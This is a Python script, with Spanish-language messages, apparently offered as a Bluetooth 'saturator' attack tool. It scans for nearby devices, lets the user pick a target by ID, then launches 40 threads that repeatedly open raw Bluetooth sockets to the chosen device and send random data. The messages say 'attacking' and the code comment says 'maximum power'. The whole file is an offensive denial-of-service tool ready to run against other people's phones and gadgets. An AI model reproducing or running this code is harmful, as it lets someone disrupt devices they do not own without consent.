#!/usr/bin/env python3
import os, sys, time, threading, subprocess, socket

try:
    from rich.console import Console
    from rich.table import Table
    console = Console()
except ImportError:
    os.system("pip install rich")
    from rich.console import Console
    from rich.table import Table

def scan_real():
    console.print("[bold cyan]🔍 Escaneando... (Prendé el Bluetooth manualmente)[/bold cyan]")
    # Usamos bluetoothctl para un escaneo más compatible
    try:
        # Iniciamos el escaneo por 5 segundos
        subprocess.run(["bluetoothctl", "scan", "on"], timeout=5, stdout=subprocess.DEVNULL)
        output = subprocess.getoutput("bluetoothctl devices")
        devices = []
        for line in output.split('\n'):
            if "Device" in line:
                parts = line.split(' ', 2)
                devices.append({"mac": parts[1], "name": parts[2]})
        return devices
    except:
        return []

def main():
    os.system("clear")
    console.print("[bold red]⚡ RXB3-SATURATOR v6.8 (FIX) ⚡[/bold red]\n")
    
    found = scan_real()
    if not found:
        console.print("[bold yellow][!] No se detectaron dispositivos.[/bold yellow]")
        console.print("[white]1. Prendé el Bluetooth del cel.\n2. Poné el otro dispositivo en 'Visible'.[/white]")
        return

    table = Table(title="DISPOSITIVOS ENCONTRADOS")
    table.add_column("ID", style="cyan")
    table.add_column("MAC", style="magenta")
    table.add_column("NOMBRE", style="white")

    for i, d in enumerate(found):
        table.add_row(str(i), d['mac'], d['name'])
    console.print(table)
    
    idx = input("\n[?] Elegí el ID del objetivo: ")
    target = found[int(idx)]['mac']

    console.print(f"[bold red]🚀 Atacando a {target}... (Ctrl+C para parar)[/bold red]")
    
    def flood():
        while True:
            try:
                s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, 0)
                s.connect((target, 0))
                s.send(os.urandom(1024))
            except: pass

    for _ in range(40): # Potencia máxima
        threading.Thread(target=flood, daemon=True).start()
    
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print("\n[✓] Detenido.")

if __name__ == "__main__":
    main()
